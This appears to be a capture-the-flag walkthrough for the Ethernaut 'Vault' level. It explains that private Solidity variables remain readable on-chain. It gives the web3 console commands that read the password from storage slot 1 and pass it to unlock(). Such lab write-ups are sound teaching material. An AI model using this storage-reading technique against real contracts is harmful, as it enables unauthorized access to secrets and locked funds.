[https://solidity-by-example.org/hacks/accessing-private-data](https://solidity-by-example.org/hacks/accessing-private-data/)

*Making something `private` or `internal` only prevents other contracts from reading or modifying the information, but it will still be visible to the whole world outside of the blockchain.*

![](https://github.com/Kuqow/ethernaut-solutions-Kuqow/blob/main/Pictures/vault1.png)

We use the `web3.eth.getStorageAt(addr,index)` function, we want the second element, so `index=1`.

![](https://github.com/Kuqow/ethernaut-solutions-Kuqow/blob/main/Pictures/vault2.png)


The `unlock(bytes32 password)` function takes bytes32 as input, so we simply call this function with what we just found : `contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')`

Finally we can verify the status of the vault by checking `bool public locked;` value : `await web3.eth.getStorageAt(instance,0)`

![](https://github.com/Kuqow/ethernaut-solutions-Kuqow/blob/main/Pictures/vault3.png)

BONUS : We can use `web3.utils.HexToAscii()` function to have a "readable" string :

![](https://github.com/Kuqow/ethernaut-solutions-Kuqow/blob/main/Pictures/vault4.png)
